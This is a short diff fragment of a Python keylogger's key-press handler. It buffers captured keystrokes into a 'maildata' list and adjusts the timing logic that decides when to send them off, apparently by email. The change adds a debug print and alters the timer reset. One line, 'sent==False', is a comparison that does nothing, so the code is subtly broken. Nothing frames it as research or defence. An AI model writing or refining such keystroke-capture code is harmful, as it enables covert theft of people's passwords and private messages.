@@ -27,12 +27,14 @@ def on_press(key):
     global mins
     global word
 
+    print(abs(mins-datetime.datetime.now().minute))
+    
     word=word+str(key)
     if len(str(key))!=3:
         maildata.append(word)
         word=''
     
-    if sent==True and datetime.datetime.now().minute%sendfreq!=0:
+    if sent==True and abs(mins-datetime.datetime.now().minute)!=0:
         sent==False
     if abs(mins-datetime.datetime.now().minute)>=sendfreq and sent==False:
         mins=datetime.datetime.now().minute
